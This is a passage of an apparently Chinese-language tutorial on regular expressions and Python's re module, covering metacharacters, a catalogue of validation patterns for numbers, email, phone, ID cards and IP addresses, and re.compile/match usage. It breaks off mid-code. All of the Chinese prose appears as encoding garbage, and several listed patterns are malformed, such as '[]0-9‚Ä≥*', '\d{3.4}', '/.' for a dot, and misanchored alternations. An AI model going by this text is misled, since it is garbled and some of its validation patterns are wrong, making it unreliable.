    <content type="text"><![CDATA[Ê≠£ÂàôÊ≠£ÂàôË°®ËææÂºèÔºåÂèàÁß∞ËßÑÂàôË°®ËææÂºè„ÄÇÔºàËã±ËØ≠ÔºöRegular ExpressionÔºåÂú®‰ª£Á†Å‰∏≠Â∏∏ÁÆÄÂÜô‰∏∫regex„ÄÅregexpÊàñREÔºâÔºåËÆ°ÁÆóÊú∫ÁßëÂ≠¶ÁöÑ‰∏Ä‰∏™Ê¶ÇÂøµ„ÄÇÊ≠£ÂàôË°®ËææÂºèÈÄöÂ∏∏Ë¢´Áî®Êù•Ê£ÄÁ¥¢„ÄÅÊõøÊç¢ÈÇ£‰∫õÁ¨¶ÂêàÊüê‰∏™Ê®°Âºè(ËßÑÂàô)ÁöÑÊñáÊú¨ÔºåÁî®‰∫ãÂÖàÂÆö‰πâÂ•ΩÁöÑ‰∏Ä‰∫õÁâπÂÆöÂ≠óÁ¨¶„ÄÅÂèäËøô‰∫õÁâπÂÆöÂ≠óÁ¨¶ÁöÑÁªÑÂêàÔºåÁªÑÊàê‰∏Ä‰∏™‚ÄúËßÑÂàôÂ≠óÁ¨¶‰∏≤‚ÄùÔºåËøô‰∏™‚ÄúËßÑÂàôÂ≠óÁ¨¶‰∏≤‚ÄùÁî®Êù•Ë°®ËææÂØπÂ≠óÁ¨¶‰∏≤ÁöÑ‰∏ÄÁßçËøáÊª§ÈÄªËæë„ÄÇ Ê≠£ÂàôË°®ËææÂºèÁöÑÂ§ßËá¥ÂåπÈÖçËøáÁ®ãÊòØÔºö ‰æùÊ¨°ÊãøÂá∫Ë°®ËææÂºèÂíåÊñáÊú¨‰∏≠ÁöÑÂ≠óÁ¨¶ÊØîËæÉÔºå Â¶ÇÊûúÊØè‰∏Ä‰∏™Â≠óÁ¨¶ÈÉΩËÉΩÂåπÈÖçÔºåÂàôÂåπÈÖçÊàêÂäüÔºõ‰∏ÄÊó¶ÊúâÂåπÈÖç‰∏çÊàêÂäüÁöÑÂ≠óÁ¨¶ÂàôÂåπÈÖçÂ§±Ë¥•„ÄÇ Â¶ÇÊûúË°®ËææÂºè‰∏≠ÊúâÈáèËØçÊàñËæπÁïåÔºåËøô‰∏™ËøáÁ®ã‰ºöÁ®çÂæÆÊúâ‰∏Ä‰∫õ‰∏çÂêå„ÄÇ Ê≠£ÂàôË°®ËææÂºèpythonÁöÑËØ≠Ê≥ïËßÑÂàôÂÖÉÂ≠óÁ¨¶ ËØ¥Êòé . ‰ª£Ë°®‰ªªÊÑèÂ≠óÁ¨¶ \ [ ] ÂåπÈÖçÂÜÖÈÉ®ÁöÑ‰ªª‰∏ÄÂ≠óÁ¨¶ÊàñÂ≠êË°®ËææÂºè [^] ÂØπÂ≠óÁ¨¶ÈõÜÂíåÂèñÈùû - ÂÆö‰πâ‰∏Ä‰∏™Âå∫Èó¥ \ ÂØπ‰∏ã‰∏ÄÂ≠óÁ¨¶ÂèñÈùûÔºàÈÄöÂ∏∏ÊòØÊôÆÈÄöÂèòÁâπÊÆäÔºåÁâπÊÆäÂèòÊôÆÈÄöÔºâ * ÂåπÈÖçÂâçÈù¢ÁöÑÂ≠óÁ¨¶ÊàñËÄÖÂ≠êË°®ËææÂºè0Ê¨°ÊàñÂ§öÊ¨° *? ÊÉ∞ÊÄßÂåπÈÖç‰∏ä‰∏Ä‰∏™ + ÂåπÈÖçÂâç‰∏Ä‰∏™Â≠óÁ¨¶ÊàñÂ≠êË°®ËææÂºè‰∏ÄÊ¨°ÊàñÂ§öÊ¨° +? ÊÉ∞ÊÄßÂåπÈÖç‰∏ä‰∏Ä‰∏™ ? ÂåπÈÖçÂâç‰∏Ä‰∏™Â≠óÁ¨¶ÊàñÂ≠êË°®ËææÂºè0Ê¨°Êàñ1Ê¨°ÈáçÂ§ç {n} ÂåπÈÖçÂâç‰∏Ä‰∏™Â≠óÁ¨¶ÊàñÂ≠êË°®ËææÂºè {m,n} ÂåπÈÖçÂâç‰∏Ä‰∏™Â≠óÁ¨¶ÊàñÂ≠êË°®ËææÂºèËá≥Â∞ëmÊ¨°Ëá≥Â§önÊ¨° {n,} ÂåπÈÖçÂâç‰∏Ä‰∏™Â≠óÁ¨¶ÊàñËÄÖÂ≠êË°®ËææÂºèËá≥Â∞ënÊ¨° {n,}? Ââç‰∏Ä‰∏™ÁöÑÊÉ∞ÊÄßÂåπÈÖç ^ ÂåπÈÖçÂ≠óÁ¨¶‰∏≤ÁöÑÂºÄÂ§¥ \A ÂåπÈÖçÂ≠óÁ¨¶‰∏≤ÂºÄÂ§¥ $ ÂåπÈÖçÂ≠óÁ¨¶‰∏≤ÁªìÊùü [\b] ÈÄÄÊ†ºÂ≠óÁ¨¶ \c ÂåπÈÖç‰∏Ä‰∏™ÊéßÂà∂Â≠óÁ¨¶ \d ÂåπÈÖç‰ªªÊÑèÊï∞Â≠ó \D ÂåπÈÖçÊï∞Â≠ó‰ª•Â§ñÁöÑÂ≠óÁ¨¶ \t ÂåπÈÖçÂà∂Ë°®Á¨¶ \w ÂåπÈÖç‰ªªÊÑèÊï∞Â≠óÂ≠óÊØç‰∏ãÂàíÁ∫ø \W ‰∏çÂåπÈÖçÊï∞Â≠óÂ≠óÊØç‰∏ãÂàíÁ∫ø‰∏Ä„ÄÅÊ†°È™åÊï∞Â≠óÁöÑË°®ËææÂºè Êï∞Â≠óÔºö^[0-9]*$ n‰ΩçÁöÑÊï∞Â≠óÔºö^\d{n}$ Ëá≥Â∞ën‰ΩçÁöÑÊï∞Â≠óÔºö^\d{n,}$ m-n‰ΩçÁöÑÊï∞Â≠óÔºö^\d{m,n}$ Èõ∂ÂíåÈùûÈõ∂ÂºÄÂ§¥ÁöÑÊï∞Â≠óÔºö^(0|[1-9][0-9]*)$ ÈùûÈõ∂ÂºÄÂ§¥ÁöÑÊúÄÂ§öÂ∏¶‰∏§‰ΩçÂ∞èÊï∞ÁöÑÊï∞Â≠óÔºö^([1-9][0-9]*)+(.[0-9]{1,2})?$ Â∏¶1-2‰ΩçÂ∞èÊï∞ÁöÑÊ≠£Êï∞ÊàñË¥üÊï∞Ôºö^(\-)?\d+(\.\d{1,2})?$ Ê≠£Êï∞„ÄÅË¥üÊï∞„ÄÅÂíåÂ∞èÊï∞Ôºö^(\-|\+)?\d+(\.\d+)?$ Êúâ‰∏§‰ΩçÂ∞èÊï∞ÁöÑÊ≠£ÂÆûÊï∞Ôºö^[0-9]+(.[0-9]{2})?$ Êúâ1~3‰ΩçÂ∞èÊï∞ÁöÑÊ≠£ÂÆûÊï∞Ôºö^[0-9]+(.[0-9]{1,3})?$ ÈùûÈõ∂ÁöÑÊ≠£Êï¥Êï∞Ôºö^[1-9]\d*$ Êàñ ^([1-9][0-9]*){1,3}$ Êàñ ^\+?[1-9][0-9]*$ ÈùûÈõ∂ÁöÑË¥üÊï¥Êï∞Ôºö^\-[1-9][]0-9‚Ä≥*$ Êàñ ^-[1-9]\d*$ ÈùûË¥üÊï¥Êï∞Ôºö^\d+$ Êàñ ^[1-9]\d*|0$ ÈùûÊ≠£Êï¥Êï∞Ôºö^-[1-9]\d*|0$ Êàñ ^((-\d+)|(0+))$ ÈùûË¥üÊµÆÁÇπÊï∞Ôºö^\d+(\.\d+)?$ Êàñ ^[1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0$ ÈùûÊ≠£ÊµÆÁÇπÊï∞Ôºö^((-\d+(\.\d+)?)|(0+(\.0+)?))$ Êàñ ^(-([1-9]\d*\.\d*|0\.\d*[1-9]\d*))|0?\.0+|0$ Ê≠£ÊµÆÁÇπÊï∞Ôºö^[1-9]\d*\.\d*|0\.\d*[1-9]\d*$ Êàñ ^(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*))$ Ë¥üÊµÆÁÇπÊï∞Ôºö^-([1-9]\d*\.\d*|0\.\d*[1-9]\d*)$ Êàñ ^(-(([0-9]+\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\.[0-9]+)|([0-9]*[1-9][0-9]*)))$ ÊµÆÁÇπÊï∞Ôºö^(-?\d+)(\.\d+)?$ Êàñ ^-?([1-9]\d*\.\d*|0\.\d*[1-9]\d*|0?\.0+|0)$‰∫å„ÄÅÊ†°È™åÂ≠óÁ¨¶ÁöÑË°®ËææÂºè Ê±âÂ≠óÔºö^[\u4e00-\u9fa5]{0,}$ Ëã±ÊñáÂíåÊï∞Â≠óÔºö^[A-Za-z0-9]+$ Êàñ ^[A-Za-z0-9]{4,40}$ ÈïøÂ∫¶‰∏∫3-20ÁöÑÊâÄÊúâÂ≠óÁ¨¶Ôºö^.{3,20}$ Áî±26‰∏™Ëã±ÊñáÂ≠óÊØçÁªÑÊàêÁöÑÂ≠óÁ¨¶‰∏≤Ôºö^[A-Za-z]+$ Áî±26‰∏™Â§ßÂÜôËã±ÊñáÂ≠óÊØçÁªÑÊàêÁöÑÂ≠óÁ¨¶‰∏≤Ôºö^[A-Z]+$ Áî±26‰∏™Â∞èÂÜôËã±ÊñáÂ≠óÊØçÁªÑÊàêÁöÑÂ≠óÁ¨¶‰∏≤Ôºö^[a-z]+$ Áî±Êï∞Â≠óÂíå26‰∏™Ëã±ÊñáÂ≠óÊØçÁªÑÊàêÁöÑÂ≠óÁ¨¶‰∏≤Ôºö^[A-Za-z0-9]+$ Áî±Êï∞Â≠ó„ÄÅ26‰∏™Ëã±ÊñáÂ≠óÊØçÊàñËÄÖ‰∏ãÂàíÁ∫øÁªÑÊàêÁöÑÂ≠óÁ¨¶‰∏≤Ôºö^\w+$ Êàñ ^\w{3,20}$ ‰∏≠Êñá„ÄÅËã±Êñá„ÄÅÊï∞Â≠óÂåÖÊã¨‰∏ãÂàíÁ∫øÔºö^[\u4E00-\u9FA5A-Za-z0-9_]+$ ‰∏≠Êñá„ÄÅËã±Êñá„ÄÅÊï∞Â≠ó‰ΩÜ‰∏çÂåÖÊã¨‰∏ãÂàíÁ∫øÁ≠âÁ¨¶Âè∑Ôºö^[\u4E00-\u9FA5A-Za-z0-9]+$ Êàñ ^[\u4E00-\u9FA5A-Za-z0-9]{2,20}$ ÂèØ‰ª•ËæìÂÖ•Âê´Êúâ^%&amp;‚Äô,;=?$\‚ÄùÁ≠âÂ≠óÁ¨¶Ôºö[^%&amp;&apos;,;=?$\x22]+ Á¶ÅÊ≠¢ËæìÂÖ•Âê´Êúâ~ÁöÑÂ≠óÁ¨¶Ôºö[^~\x22]+‰∏â„ÄÅÁâπÊÆäÈúÄÊ±ÇË°®ËææÂºè EmailÂú∞ÂùÄÔºö^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*$ ÂüüÂêçÔºö[a-zA-Z0-9][-a-zA-Z0-9]{0,62}(/.[a-zA-Z0-9][-a-zA-Z0-9]{0,62})+/.? InternetURLÔºö[a-zA-z]+://[^\s]* Êàñ ^http://([\w-]+\.)+[\w-]+(/[\w-./?%&amp;=]*)?$ ÊâãÊú∫Âè∑Á†ÅÔºö^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\d{8}$ ÁîµËØùÂè∑Á†Å(‚ÄúXXX-XXXXXXX‚Äù„ÄÅ‚ÄùXXXX-XXXXXXXX‚Äù„ÄÅ‚ÄùXXX-XXXXXXX‚Äù„ÄÅ‚ÄùXXX-XXXXXXXX‚Äù„ÄÅ‚ÄùXXXXXXX‚ÄùÂíå‚ÄùXXXXXXXX)Ôºö^($$\d{3,4}-)|\d{3.4}-)?\d{7,8}$ ÂõΩÂÜÖÁîµËØùÂè∑Á†Å(0511-4405222„ÄÅ021-87888822)Ôºö\d{3}-\d{8}|\d{4}-\d{7} Ë∫´‰ªΩËØÅÂè∑(15‰Ωç„ÄÅ18‰ΩçÊï∞Â≠ó)Ôºö^\d{15}|\d{18}$ Áü≠Ë∫´‰ªΩËØÅÂè∑Á†Å(Êï∞Â≠ó„ÄÅÂ≠óÊØçxÁªìÂ∞æ)Ôºö^([0-9]){7,18}(x|X)?$ Êàñ ^\d{8,18}|[0-9x]{8,18}|[0-9X]{8,18}?$ Â∏êÂè∑ÊòØÂê¶ÂêàÊ≥ï(Â≠óÊØçÂºÄÂ§¥ÔºåÂÖÅËÆ∏5-16Â≠óËäÇÔºåÂÖÅËÆ∏Â≠óÊØçÊï∞Â≠ó‰∏ãÂàíÁ∫ø)Ôºö^[a-zA-Z][a-zA-Z0-9_]{4,15}$ ÂØÜÁ†Å(‰ª•Â≠óÊØçÂºÄÂ§¥ÔºåÈïøÂ∫¶Âú®6~18‰πãÈó¥ÔºåÂè™ËÉΩÂåÖÂê´Â≠óÊØç„ÄÅÊï∞Â≠óÂíå‰∏ãÂàíÁ∫ø)Ôºö^[a-zA-Z]\w{5,17}$ Âº∫ÂØÜÁ†Å(ÂøÖÈ°ªÂåÖÂê´Â§ßÂ∞èÂÜôÂ≠óÊØçÂíåÊï∞Â≠óÁöÑÁªÑÂêàÔºå‰∏çËÉΩ‰ΩøÁî®ÁâπÊÆäÂ≠óÁ¨¶ÔºåÈïøÂ∫¶Âú®8-10‰πãÈó¥)Ôºö^(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$ Êó•ÊúüÊ†ºÂºèÔºö^\d{4}-\d{1,2}-\d{1,2} ‰∏ÄÂπ¥ÁöÑ12‰∏™Êúà(01ÔΩû09Âíå1ÔΩû12)Ôºö^(0?[1-9]|1[0-2])$ ‰∏Ä‰∏™ÊúàÁöÑ31Â§©(01ÔΩû09Âíå1ÔΩû31)Ôºö^((0?[1-9])|((1|2)[0-9])|30|31)$ Èí±ÁöÑËæìÂÖ•Ê†ºÂºèÔºö ÊúâÂõõÁßçÈí±ÁöÑË°®Á§∫ÂΩ¢ÂºèÊàë‰ª¨ÂèØ‰ª•Êé•Âèó:‚Äù10000.00‚Ä≥ Âíå ‚Äú10,000.00‚Ä≥, ÂíåÊ≤°Êúâ ‚ÄúÂàÜ‚Äù ÁöÑ ‚Äú10000‚Ä≥ Âíå ‚Äú10,000‚Ä≥Ôºö^[1-9][0-9]*$ ËøôË°®Á§∫‰ªªÊÑè‰∏Ä‰∏™‰∏ç‰ª•0ÂºÄÂ§¥ÁöÑÊï∞Â≠óÔºå‰ΩÜÊòØÔºåËøô‰πüÊÑèÂë≥ÁùÄ‰∏Ä‰∏™Â≠óÁ¨¶‚Äù0‚Ä≥‰∏çÈÄöËøáÔºåÊâÄ‰ª•Êàë‰ª¨ÈááÁî®‰∏ãÈù¢ÁöÑÂΩ¢ÂºèÔºö^(0|[1-9][0-9]*)$ ‰∏Ä‰∏™0ÊàñËÄÖ‰∏Ä‰∏™‰∏ç‰ª•0ÂºÄÂ§¥ÁöÑÊï∞Â≠ó.Êàë‰ª¨ËøòÂèØ‰ª•ÂÖÅËÆ∏ÂºÄÂ§¥Êúâ‰∏Ä‰∏™Ë¥üÂè∑Ôºö^(0|-?[1-9][0-9]*)$ ËøôË°®Á§∫‰∏Ä‰∏™0ÊàñËÄÖ‰∏Ä‰∏™ÂèØËÉΩ‰∏∫Ë¥üÁöÑÂºÄÂ§¥‰∏ç‰∏∫0ÁöÑÊï∞Â≠ó.ËÆ©Áî®Êà∑‰ª•0ÂºÄÂ§¥Â•Ω‰∫Ü.ÊääË¥üÂè∑ÁöÑ‰πüÂéªÊéâÔºåÂõ†‰∏∫Èí±ÊÄª‰∏çËÉΩÊòØË¥üÁöÑÂêß.‰∏ãÈù¢Êàë‰ª¨Ë¶ÅÂä†ÁöÑÊòØËØ¥ÊòéÂèØËÉΩÁöÑÂ∞èÊï∞ÈÉ®ÂàÜÔºö^[0-9]+(.[0-9]+)?$ ÂøÖÈ°ªËØ¥ÊòéÁöÑÊòØÔºåÂ∞èÊï∞ÁÇπÂêéÈù¢Ëá≥Â∞ëÂ∫îËØ•Êúâ1‰ΩçÊï∞ÔºåÊâÄ‰ª•‚Äù10.‚ÄùÊòØ‰∏çÈÄöËøáÁöÑÔºå‰ΩÜÊòØ ‚Äú10‚Ä≥ Âíå ‚Äú10.2‚Ä≥ ÊòØÈÄöËøáÁöÑÔºö^[0-9]+(.[0-9]{2})?$ ËøôÊ†∑Êàë‰ª¨ËßÑÂÆöÂ∞èÊï∞ÁÇπÂêéÈù¢ÂøÖÈ°ªÊúâ‰∏§‰ΩçÔºåÂ¶ÇÊûú‰Ω†ËÆ§‰∏∫Â§™ËãõÂàª‰∫ÜÔºåÂèØ‰ª•ËøôÊ†∑Ôºö^[0-9]+(.[0-9]{1,2})?$ ËøôÊ†∑Â∞±ÂÖÅËÆ∏Áî®Êà∑Âè™ÂÜô‰∏Ä‰ΩçÂ∞èÊï∞„ÄÇ‰∏ãÈù¢Êàë‰ª¨ËØ•ËÄÉËôëÊï∞Â≠ó‰∏≠ÁöÑÈÄóÂè∑‰∫ÜÔºåÊàë‰ª¨ÂèØ‰ª•ËøôÊ†∑Ôºö^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$ 1Âà∞3‰∏™Êï∞Â≠óÔºåÂêéÈù¢Ë∑üÁùÄ‰ªªÊÑè‰∏™ ÈÄóÂè∑+3‰∏™Êï∞Â≠óÔºåÈÄóÂè∑Êàê‰∏∫ÂèØÈÄâÔºåËÄå‰∏çÊòØÂøÖÈ°ªÔºö^([0-9]+|[0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$ Â§áÊ≥®ÔºöËøôÂ∞±ÊòØÊúÄÁªàÁªìÊûú‰∫ÜÔºåÂà´Âøò‰∫Ü‚Äù+‚ÄùÂèØ‰ª•Áî®‚Äù*‚ÄùÊõø‰ª£„ÄÇÂ¶ÇÊûú‰Ω†ËßâÂæóÁ©∫Â≠óÁ¨¶‰∏≤‰πüÂèØ‰ª•Êé•ÂèóÁöÑËØù(Â•áÊÄ™Ôºå‰∏∫‰ªÄ‰πà?)ÊúÄÂêéÔºåÂà´Âøò‰∫ÜÂú®Áî®ÂáΩÊï∞Êó∂ÂéªÊéâÂéªÊéâÈÇ£‰∏™ÂèçÊñúÊù†Ôºå‰∏ÄËà¨ÁöÑÈîôËØØÈÉΩÂú®ËøôÈáå xmlÊñá‰ª∂Ôºö^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\.[x|X][m|M][l|L]$ ‰∏≠ÊñáÂ≠óÁ¨¶ÁöÑÊ≠£ÂàôË°®ËææÂºèÔºö[\u4e00-\u9fa5] ÂèåÂ≠óËäÇÂ≠óÁ¨¶Ôºö[^\x00-\xff] (ÂåÖÊã¨Ê±âÂ≠óÂú®ÂÜÖÔºåÂèØ‰ª•Áî®Êù•ËÆ°ÁÆóÂ≠óÁ¨¶‰∏≤ÁöÑÈïøÂ∫¶(‰∏Ä‰∏™ÂèåÂ≠óËäÇÂ≠óÁ¨¶ÈïøÂ∫¶ËÆ°2ÔºåASCIIÂ≠óÁ¨¶ËÆ°1)) Á©∫ÁôΩË°åÁöÑÊ≠£ÂàôË°®ËææÂºèÔºö\n\s*\r (ÂèØ‰ª•Áî®Êù•Âà†Èô§Á©∫ÁôΩË°å) HTMLÊ†áËÆ∞ÁöÑÊ≠£ÂàôË°®ËææÂºèÔºö&lt;(\S*?)[^&gt;]*&gt;.*?&lt;/\1&gt;|&lt;.*? /&gt; (ÁΩë‰∏äÊµÅ‰º†ÁöÑÁâàÊú¨Â§™Á≥üÁ≥ïÔºå‰∏äÈù¢Ëøô‰∏™‰πü‰ªÖ‰ªÖËÉΩÈÉ®ÂàÜÔºåÂØπ‰∫éÂ§çÊùÇÁöÑÂµåÂ•óÊ†áËÆ∞‰æùÊóßÊó†ËÉΩ‰∏∫Âäõ) È¶ñÂ∞æÁ©∫ÁôΩÂ≠óÁ¨¶ÁöÑÊ≠£ÂàôË°®ËææÂºèÔºö^\s*|\s*$Êàñ(^\s*)|(\s*$) (ÂèØ‰ª•Áî®Êù•Âà†Èô§Ë°åÈ¶ñË°åÂ∞æÁöÑÁ©∫ÁôΩÂ≠óÁ¨¶(ÂåÖÊã¨Á©∫Ê†º„ÄÅÂà∂Ë°®Á¨¶„ÄÅÊç¢È°µÁ¨¶Á≠âÁ≠â)ÔºåÈùûÂ∏∏ÊúâÁî®ÁöÑË°®ËææÂºè) ËÖæËÆØQQÂè∑Ôºö[1-9][0-9]{4,} (ËÖæËÆØQQÂè∑‰ªé10000ÂºÄÂßã) ‰∏≠ÂõΩÈÇÆÊîøÁºñÁ†ÅÔºö[1-9]\d{5}(?!\d) (‰∏≠ÂõΩÈÇÆÊîøÁºñÁ†Å‰∏∫6‰ΩçÊï∞Â≠ó) IPÂú∞ÂùÄÔºö\d+\.\d+\.\d+\.\d+ (ÊèêÂèñIPÂú∞ÂùÄÊó∂ÊúâÁî®) IPÂú∞ÂùÄÔºö((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.){3}(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)) (Áî±@È£ûÈæô‰∏âÂ∞ë Êèê‰æõÔºåÊÑüË∞¢ÂÖ±‰∫´) ËØ≠Ê≥ïËßÑÂàôÈôÑÂ∏¶ÂÆû‰æã ÂèçÊñúÊù†ÈóÆÈ¢ò‰∏éÂ§ßÂ§öÊï∞ÁºñÁ®ãËØ≠Ë®ÄÁõ∏ÂêåÔºåÊ≠£ÂàôË°®ËææÂºèÈáå‰ΩøÁî®‚Äù\‚Äù‰Ωú‰∏∫ËΩ¨‰πâÂ≠óÁ¨¶ÔºåËøôÂ∞±ÂèØËÉΩÈÄ†ÊàêÂèçÊñúÊù†Âõ∞Êâ∞„ÄÇÂÅáÂ¶Ç‰Ω†ÈúÄË¶ÅÂåπÈÖçÊñáÊú¨‰∏≠ÁöÑÂ≠óÁ¨¶‚Äù\‚ÄùÔºåÈÇ£‰πà‰ΩøÁî®ÁºñÁ®ãËØ≠Ë®ÄË°®Á§∫ÁöÑÊ≠£ÂàôË°®ËææÂºèÈáåÂ∞ÜÈúÄË¶Å4‰∏™ÂèçÊñúÊù†‚Äù\\‚ÄùÔºöÂâç‰∏§‰∏™ÂíåÂêé‰∏§‰∏™ÂàÜÂà´Áî®‰∫éÂú®ÁºñÁ®ãËØ≠Ë®ÄÈáåËΩ¨‰πâÊàêÂèçÊñúÊù†ÔºåËΩ¨Êç¢Êàê‰∏§‰∏™ÂèçÊñúÊù†ÂêéÂÜçÂú®Ê≠£ÂàôË°®ËææÂºèÈáåËΩ¨‰πâÊàê‰∏Ä‰∏™ÂèçÊñúÊù†„ÄÇ PythonÈáåÁöÑÂéüÁîüÂ≠óÁ¨¶‰∏≤ÂæàÂ•ΩÂú∞Ëß£ÂÜ≥‰∫ÜËøô‰∏™ÈóÆÈ¢òÔºåËøô‰∏™‰æãÂ≠ê‰∏≠ÁöÑÊ≠£ÂàôË°®ËææÂºèÂèØ‰ª•‰ΩøÁî®r‚Äù\‚ÄùË°®Á§∫„ÄÇÂêåÊ†∑ÔºåÂåπÈÖç‰∏Ä‰∏™Êï∞Â≠óÁöÑ‚Äù\d‚ÄùÂèØ‰ª•ÂÜôÊàêr‚Äù\d‚Äù„ÄÇÊúâ‰∫ÜÂéüÁîüÂ≠óÁ¨¶‰∏≤ÔºåÂ¶àÂ¶à‰πü‰∏çÁî®ÊãÖÂøÉÊòØ‰∏çÊòØÊºèÂÜô‰∫ÜÂèçÊñúÊù†ÔºåÂÜôÂá∫Êù•ÁöÑË°®ËææÂºè‰πüÊõ¥Áõ¥ËßÇÂãí reÊ®°ÂùóPython Ëá™Â∏¶‰∫ÜreÊ®°ÂùóÔºåÂÆÉÊèê‰æõ‰∫ÜÂØπÊ≠£ÂàôË°®ËææÂºèÁöÑÊîØÊåÅ„ÄÇ‰∏ªË¶ÅÁî®Âà∞ÁöÑÊñπÊ≥ïÂàó‰∏æÂ¶Ç‰∏ã: #ËøîÂõûpatternÂØπË±° re.compile(string[,flag]) #‰ª•‰∏ã‰∏∫ÂåπÈÖçÊâÄÁî®ÂáΩÊï∞ re.match(pattern, string[, flags]) re.search(pattern, string[, flags]) re.split(pattern, string[, maxsplit]) re.findall(pattern, string[, flags]) re.finditer(pattern, string[, flags]) re.sub(pattern, repl, string[, count]) re.subn(pattern, repl, string[, count])PythonÈÄöËøáreÊ®°ÂùóÊèê‰æõÂØπÊ≠£ÂàôË°®ËææÂºèÁöÑÊîØÊåÅ„ÄÇ‰ΩøÁî®reÁöÑ‰∏ÄËà¨Ê≠•È™§ÊòØÂÖàÂ∞ÜÊ≠£ÂàôË°®ËææÂºèÁöÑÂ≠óÁ¨¶‰∏≤ÂΩ¢ÂºèÁºñËØë‰∏∫PatternÂÆû‰æãÔºåÁÑ∂Âêé‰ΩøÁî®PatternÂÆû‰æãÂ§ÑÁêÜÊñáÊú¨Âπ∂Ëé∑ÂæóÂåπÈÖçÁªìÊûúÔºà‰∏Ä‰∏™MatchÂÆû‰æãÔºâÔºåÊúÄÂêé‰ΩøÁî®MatchÂÆû‰æãËé∑Âæó‰ø°ÊÅØÔºåËøõË°åÂÖ∂‰ªñÁöÑÊìç‰Ωú„ÄÇ patternÂèØ‰ª•ÁêÜËß£‰∏∫‰∏Ä‰∏™ÂåπÈÖçÊ®°ÂºèÔºåÈÇ£‰πàÊàë‰ª¨ÊÄé‰πàËé∑ÂæóËøô‰∏™ÂåπÈÖçÊ®°ÂºèÂë¢ÔºüÂæàÁÆÄÂçïÔºåÊàë‰ª¨ÈúÄË¶ÅÂà©Áî®re.compileÊñπÊ≥ïÂ∞±ÂèØ‰ª•„ÄÇ‰æãÂ¶Ç:pattern = re.compile(r‚Äôhello‚Äô) Âú®ÂèÇÊï∞‰∏≠Êàë‰ª¨‰º†ÂÖ•‰∫ÜÂéüÁîüÂ≠óÁ¨¶‰∏≤ÂØπË±°ÔºåÈÄöËøácompileÊñπÊ≥ïÁºñËØëÁîüÊàê‰∏Ä‰∏™patternÂØπË±°ÔºåÁÑ∂ÂêéÊàë‰ª¨Âà©Áî®Ëøô‰∏™ÂØπË±°Êù•ËøõË°åËøõ‰∏ÄÊ≠•ÁöÑÂåπÈÖç„ÄÇÂè¶Â§ñÂ§ßÂÆ∂ÂèØËÉΩÊ≥®ÊÑèÂà∞‰∫ÜÂè¶‰∏Ä‰∏™ÂèÇÊï∞ flagsÔºåÂú®ËøôÈáåËß£Èáä‰∏Ä‰∏ãËøô‰∏™ÂèÇÊï∞ÁöÑÂê´‰πâÔºö ÂèÇÊï∞flagÊòØÂåπÈÖçÊ®°ÂºèÔºåÂèñÂÄºÂèØ‰ª•‰ΩøÁî®Êåâ‰ΩçÊàñËøêÁÆóÁ¨¶‚Äô|‚ÄôË°®Á§∫ÂêåÊó∂ÁîüÊïàÔºåÊØîÂ¶Çre.I | re.M„ÄÇ ÂèØÈÄâÂÄºÊúâ: ‚Ä¢ re.I(ÂÖ®ÊãºÔºöIGNORECASE): ÂøΩÁï•Â§ßÂ∞èÂÜôÔºàÊã¨Âè∑ÂÜÖÊòØÂÆåÊï¥ÂÜôÊ≥ïÔºå‰∏ãÂêåÔºâ ‚Ä¢ re.M(ÂÖ®ÊãºÔºöMULTILINE): Â§öË°åÊ®°ÂºèÔºåÊîπÂèò&apos;^&apos;Âíå&apos;$&apos;ÁöÑË°å‰∏∫ÔºàÂèÇËßÅ‰∏äÂõæÔºâ ‚Ä¢ re.S(ÂÖ®ÊãºÔºöDOTALL): ÁÇπ‰ªªÊÑèÂåπÈÖçÊ®°ÂºèÔºåÊîπÂèò&apos;.&apos;ÁöÑË°å‰∏∫ ‚Ä¢ re.L(ÂÖ®ÊãºÔºöLOCALE): ‰ΩøÈ¢ÑÂÆöÂ≠óÁ¨¶Á±ª \w \W \b \B \s \S ÂèñÂÜ≥‰∫éÂΩìÂâçÂå∫ÂüüËÆæÂÆö ‚Ä¢ re.U(ÂÖ®ÊãºÔºöUNICODE): ‰ΩøÈ¢ÑÂÆöÂ≠óÁ¨¶Á±ª \w \W \b \B \s \S \d \D ÂèñÂÜ≥‰∫éunicodeÂÆö‰πâÁöÑÂ≠óÁ¨¶Â±ûÊÄß ‚Ä¢ re.X(ÂÖ®ÊãºÔºöVERBOSE): ËØ¶ÁªÜÊ®°Âºè„ÄÇËøô‰∏™Ê®°Âºè‰∏ãÊ≠£ÂàôË°®ËææÂºèÂèØ‰ª•ÊòØÂ§öË°åÔºåÂøΩÁï•Á©∫ÁôΩÂ≠óÁ¨¶ÔºåÂπ∂ÂèØ‰ª•Âä†ÂÖ•Ê≥®Èáä„ÄÇÁÆÄÂçïÂåπÈÖç# _*_ coding: UTF-8 _*_ import re pattern=re.compile(r&apos;hello&apos;,re.IGNORECASE) # Â∞ÜÊ≠£ÂàôË°®ËææÂºèÁºñËØëÊàêPatternÂØπË±°,‰∏çÂå∫ÂàÜÂ§ßÂ∞èÂÜôre.IGNORECASE result1=re.match(pattern,&apos;hello1&apos;) #Êàñresult1 = pattern.match(&apos;hello world!&apos;) if result1: print(result1.group()) else: print(&apos;ÂåπÈÖçÂ§±Ë¥•&apos;Ôºâre.matchÂíåre.searchÁöÑÂå∫Âà´re.matchÂè™ÂåπÈÖçÂ≠óÁ¨¶‰∏≤ÁöÑÂºÄÂßãÔºåÂ¶ÇÊûúÂ≠óÁ¨¶‰∏≤ÂºÄÂßã‰∏çÁ¨¶ÂêàÊ≠£ÂàôË°®ËææÂºèÔºåÂàôÂåπÈÖçÂ§±Ë¥•ÔºåÂáΩÊï∞ËøîÂõûNoneÔºõËÄåre.searchÂåπÈÖçÊï¥‰∏™Â≠óÁ¨¶‰∏≤ÔºåÁõ¥Âà∞ÊâæÂà∞‰∏Ä‰∏™ÂåπÈÖç„ÄÇ import re line = &quot;Cats are smarter than dogs&quot;; matchObj = re.match( 